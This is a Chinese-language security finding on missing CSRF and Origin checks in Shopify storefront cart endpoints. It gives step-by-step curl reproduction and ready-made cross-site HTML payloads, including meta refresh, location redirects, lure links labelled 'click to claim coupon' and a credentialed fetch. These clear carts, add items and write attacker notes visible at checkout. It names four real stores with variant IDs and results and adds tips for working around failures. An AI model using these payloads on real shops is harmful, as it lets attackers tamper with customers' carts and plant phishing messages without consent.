# Shopify 店面购物车状态变更无 CSRF/Origin 校验（GET/POST 可跨站触发 + note 投毒）

## 结论
Shopify 原生 Ajax Cart API 的状态变更端点（/cart/add、/cart/add.js、/cart/change(.js)、/cart/update.js、/cart/clear(.js)）
可用 GET/POST 跨站触发，服务端**不校验 CSRF 令牌，也不校验 Origin / Referer / Sec-Fetch-Site**；
而 cart cookie 属性为 **SameSite=Lax（无 HttpOnly、无 Secure）**，顶层 GET 导航会携带该 cookie。
=> 第三方站点让受害者浏览器顶层导航到 `https://<shop>/cart/clear` 即可静默清空其购物车；
   用 `https://<shop>/cart/add?id=<variant>&quantity=n` 可向其购物车塞入任意商品；
   用 `POST /cart/update.js` 或 **纯 GET `/cart/update.js?note=..&attributes[..]=..`** 可写入任意 **note / attributes**（结账页对受害者可见，可用于社工/钓鱼）。
无需任何凭据、无需 CSRF 令牌、无需额外交互。影响：购物车完整性破坏（清空/污染/投毒），不涉账号与支付。

★2026-11-12 补充结论（retro32.com 实测）：**投毒不必依赖跨站 POST**。SameSite=Lax 只抑制跨站 POST / 子资源请求携带 cookie，
而顶层 GET 导航照常携带 → `GET /cart/update.js?note=<任意>&attributes%5Bvia%5D=get` 直接 200 且写入生效。
即一个 `<a>` / `<meta refresh>` / `location=` 就能完成「清空 + 加购 + 改数量 + 写 note/attributes」全部动作，浏览器侧可用性比原先记录的更高。

## 前提
- 目标为 Shopify 托管店面，Ajax Cart API 路径可达（/cart.js 返回 JSON）。
- 受害者浏览器持有本店 cart cookie（匿名加购即生成；SameSite=Lax、无 HttpOnly/Secure）。
- 触发方式：链接 / meta-refresh / window.location（GET 顶层导航）或自动提交表单 / fetch(credentials:'include')（POST）。
- 需要一个可加购的 variant id（公开商品页 / /products.json 即可取）。

## 复现步骤（curl，示意）

```bash
SHOP=https://<shop>
VARIANT=<variant-id>            # 换成目标店主推变体 id（从 /products.json 或页面 JS 取）

# 0) 基线：建立会话、加 1 件、读 item_count
curl -sk -c cj3.txt -A "$UA" "$SHOP/" -o /dev/null
curl -sk -b cj3.txt -c cj3.txt -A "$UA" "$SHOP/cart/add.js?id=$VARIANT&quantity=1"
curl -sk -b cj3.txt "$SHOP/cart.js"          # -> {"item_count":1,...}
#    同时看 Set-Cookie: cart=...; path=/; SameSite=Lax（无 HttpOnly / 无 Secure）

# 1) 判活：伪造跨站来源打清空端点（GET，无令牌）
curl -sk -i -b cj3.txt "$SHOP/cart/clear" \
  -H 'Origin: null' \
  -H 'Referer: https://evil.example/page' \
  -H 'Sec-Fetch-Site: cross-site' \
  -H 'Sec-Fetch-Mode: navigate' \
  -H 'Sec-Fetch-Dest: document'
#   实测回显：HTTP/2 302  location: https://<shop>/cart
#   没有任何“令牌缺失/来源非法”拒绝 —— 说明服务端不校验

# 2) 确认生效（决定性判据）：item_count 由 1 -> 0
curl -sk -b cj3.txt "$SHOP/cart.js"          # -> {"item_count":0,...}  购物车被清空

# 3) 写路径同样无令牌：向购物车塞入任意商品 / 改行项数量
curl -sk -b cj3.txt "$SHOP/cart/add?id=$VARIANT&quantity=1" -H 'Referer: https://evil.example/'
#   302 location: /cart  ->  /cart.js item_count 递增
curl -sk -b cj3.txt "$SHOP/cart/change?line=1&quantity=0"   -H 'Referer: https://evil.example/'
#   302 -> /cart.js item_count 归零

# 4) 购物车投毒（POST 版）：跨站写入任意 note / attributes（结账页可见）
curl -sk -i -b cj3.txt -X POST "$SHOP/cart/update.js" \
  -H 'Origin: https://evil.example' -H 'Content-Type: application/json' \
  -d '{"note":"CSRF-POISON","attributes":{"pwn":"1"}}'
#   200 -> 随后 GET /cart.js -> {"note":"CSRF-POISON","attributes":{"pwn":"1"},...}

# 4b) ★购物车投毒（纯 GET 版，首选）：不需要 JS、不受 SameSite=Lax 对跨站 POST 的抑制
curl -sk -i -b cj3.txt "$SHOP/cart/update.js?note=GET-POISON&attributes%5Bvia%5D=get" \
  -H 'Origin: null' -H 'Referer: https://evil.example/page' -H 'Sec-Fetch-Site: cross-site'
#   200 -> 响应体直接回显 {"note":"GET-POISON","attributes":{...,"via":"get"},...}

# 5) .js 变体同样无防护：跨站 GET /cart/clear.js
curl -sk -i -b cj3.txt "$SHOP/cart/clear.js" -H 'Origin: null' -H 'Referer: https://evil.example/'
#   200 -> 随后 /cart.js item_count -> 0
```

## 跨站触发向量（受害者侧页面）
```html
<!-- 方式一：meta refresh 顶层导航 -->
<meta http-equiv="refresh" content="0;url=https://<shop>/cart/clear">
<!-- 方式二：脚本 -->
<script>location='https://<shop>/cart/clear'</script>
<!-- 方式三：诱导点击 -->
<a href="https://<shop>/cart/clear">点击领券</a>
<!-- 方式四：纯 GET 投毒（最省事，无需任何脚本执行） -->
<a href="https://<shop>/cart/update.js?note=GET-POISON&attributes%5Bvia%5D=get">点击领券</a>
<img src="https://<shop>/cart/add?id=<variant>&quantity=1">   <!-- 子资源请求在 Lax 下不带 cookie，仅作探测；要生效需顶层导航 -->
<!-- 方式五：POST 投毒（自动提交表单或 fetch 带 credentials） -->
<script>fetch('https://<shop>/cart/update.js',{method:'POST',credentials:'include',
  headers:{'Content-Type':'application/json'},
  body:JSON.stringify({note:'CSRF-POISON',attributes:{pwn:'1'}})})</script>
```
因 cart cookie 为 SameSite=Lax，顶层 GET 导航会携带它 → 请求被当作受害者本人操作执行；
跨站 POST 在浏览器侧可能因 Lax 不带 cookie，但服务端仍无校验，纯 GET 向量（4b）可完整替代。

## 判据
- 跨站来源（Origin: null / Referer 外站 / Sec-Fetch-Site: cross-site）下状态变更端点仍 302/200 执行；
- 随后带同一 cart cookie 读 /cart.js 观察到状态真实变化（item_count 增/减/清零，或 note/attributes 被写入）=> CSRF 成立。

## 多店实例（同一平台行为，四个相互独立的店面均命中）
同一品牌下可能存在多个相互独立的 Shopify 店面（不同宿主、各自 Storefront token / cart cookie），
需逐店单独验证；下面四店均为同一套端点 + 同一判据复现通过：
- 店 A（www.thegamecollection.net）：cart cookie SameSite=Lax 无 HttpOnly/Secure；跨站 GET /cart/clear → 302，/cart.js item_count 1→0；跨站 GET /cart/add → 302 使数量递增；跨站 GET /cart/change?line=1&quantity=0 → 302 使 →0。
- 店 B（collect.thegamecollection.net，独立店面，shopId 87370006865）：POST /cart/add.js?id=53814901244241&quantity=1 → 200 Set-Cookie cart=…; path=/; SameSite=Lax（无 HttpOnly/Secure），/cart.js item_count=1；跨站 GET /cart/clear → 302，item_count 1→0；跨站 GET /cart/add?id=53814901244241&quantity=3 → 302，item_count 0→3；跨站 GET /cart/change?line=1&quantity=0 → 302，item_count 3→0。全程零令牌、零来源拒绝。
- 店 C（retro-refresh.com）：GET /cart/add.js?id=56946419499340&quantity=1 → Set-Cookie cart=…; SameSite=Lax（无 HttpOnly/Secure），/cart.js item_count=1。跨站 GET /cart/clear → 302，/cart.js item_count 1→0；跨站 GET /cart/add → 302，item_count 0→2；跨站 GET /cart/clear.js（Origin: null / Referer evil）→ 200，item_count→0；跨站 POST /cart/change（Origin: https://evil.example，form line=1&quantity=0）→ 302，item_count→0；跨站 POST /cart/add.js（JSON）→ 422（库存限制，非 CSRF 拒绝）但写实际生效。/cart/checkout 空车 302 回首页（非状态变更加固点）。★跨站 POST /cart/update.js（Origin: https://evil.example，JSON {"note":"CSRF-POISON-1271","attributes":{"pwn":"i1271"}}）→ 200，/cart.js 回显 note='CSRF-POISON-1271'、attributes={'pwn':'i1271'}。
- 店 D（www.retro32.com，task#12 / finding_id=190，2026-11-12 11:29-11:42 UTC）：POST /cart/add.js（JSON {"items":[{"id":54482510053723,"quantity":1}]}）→ 200，Set-Cookie: cart=hWNJ3mJk…%3Fkey%3D<REDACTED>; path=/; expires=Thu, 11 Feb 2027; SameSite=Lax（无 HttpOnly、无 Secure），/cart.js → item_count=1、total_price=2000。
  · 跨站 GET /cart/clear（Origin: null / Referer https://evil.example/page / Sec-Fetch-Site: cross-site / Sec-Fetch-Mode: navigate / Sec-Fetch-Dest: document）→ 302 location: https://www.retro32.com/cart；随后 /cart.js item_count 1→0（决定性判据）。
  · 跨站 GET /cart/add?id=54482510053723&quantity=1 → 302，item_count 0→1（另一轮 1→2、total_price 2000→4000）。
  · 跨站 GET /cart/add.js?id=…&quantity=2 → 200 {"quantity":2}，item_count 0→2。
  · 跨站 GET /cart/change.js?line=1&quantity=1 → 200，item_count 2→1；?quantity=0 → 200，item_count 1→0。
  · 跨站 GET /cart/clear.js → 200，item_count→0。
  · ★★纯 GET 投毒：GET /cart/update.js?note=GET-POISON-i3895&attributes%5Bvia%5D=get（同上跨站头）→ 200，响应回显 {"note":"GET-POISON-i3895","attributes":{"pwn":"i3895","src":"evil.example","via":"get"},…}；随后 /cart.js 复核可见。
  · 旁证 POST 面：POST /cart/update.js（Origin: https://evil.example，JSON {"note":"CSRF-POISON-i3895","attributes":{"pwn":"i3895"}}）→ 200，/cart.js 回显 note='CSRF-POISON-i3895'。
  · 全程零 CSRF token、零 Origin/Referer/Sec-Fetch-Site 拒绝；原始回显落盘 /opt/artex/data/tasks/12/i3895/（h0/h1/hA*.txt、bodyA*.json、c*.json）。

## 失败/判死原因
- 目标在店面层自建了 CSRF 中间件，或把 cart cookie 设为 SameSite=Strict（顶层导航不携带 cookie）；
- 非 Shopify 原生 Ajax Cart API（其他 CMS/自研购物车）用各自端点与判据；
- 端点被 CDN/WAF 拦截（关注 cf-ray / 403 而非 302）；
- 读 /cart.js 基线未沿用同一 cart cookie 会看不到变化，误判为“无效”；
- /cart/update.js 用 GET 若 404，试去掉 .js（/cart/update）或退回 POST 向量；attributes 用 `attributes[key]=value`（URL 编码 %5B %5D），不要写成 JSON。
